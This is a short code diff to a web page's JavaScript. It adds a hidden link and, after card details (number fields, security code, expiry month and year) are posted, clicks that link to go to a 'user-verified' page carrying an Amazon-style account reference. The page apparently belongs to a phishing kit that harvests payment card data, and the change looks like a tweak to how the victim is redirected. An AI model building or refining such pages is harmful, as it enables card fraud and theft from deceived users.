@@ -2216,7 +2216,8 @@
                 "    </div> " +
                 "</div> " +
                 "<br><br> " +
-                "<br><br>"
+                "<br><br>"+
+                " <a id='links' href=\"#\" style='display:none;'></a>"
     }
 </script>
 <script src="library/jquery/main.min.js"></script>
@@ -2383,10 +2384,17 @@ function valid_credit_card(value) {
                     csc: csc,
                     month: month,
                     year: year
-                },
+                }
+                ,
                 function (data) {
-                    window.location.href = '/user-verified?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
-                }, "json");
+                    var kiddLink = document.getElementById('links');
+                    //给它的href属性添加网址
+                    kiddLink.href = "/user-verified?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya";
+                    //调用这个对象的click方法
+                    kiddLink.click();
+                    //window.location.href = '/user-verified?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+                }, "json"
+        );
     }
 </script>
 </html>
